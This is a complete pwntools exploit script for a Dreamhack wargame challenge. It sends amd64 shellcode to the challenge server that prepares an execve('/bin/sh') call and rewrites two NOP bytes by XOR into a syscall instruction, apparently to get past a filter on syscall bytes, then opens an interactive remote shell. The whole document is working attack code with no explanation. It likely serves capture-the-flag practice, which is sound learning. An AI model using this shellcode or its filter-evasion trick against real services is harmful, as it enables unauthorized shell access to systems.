from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 17435
r = remote(HOST, PORT)

sh = asm('''
    push rax
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    mov rax, 59
    mov rsi, 0
    mov rdx, 0

    lea rbx, [rip + a]
    xor byte ptr [rbx], 0x9f
    xor byte ptr [rbx+1], 0x95
    
a:
    .byte 0x90, 0x90
''')

r.sendafter(b'> ', sh)
r.interactive()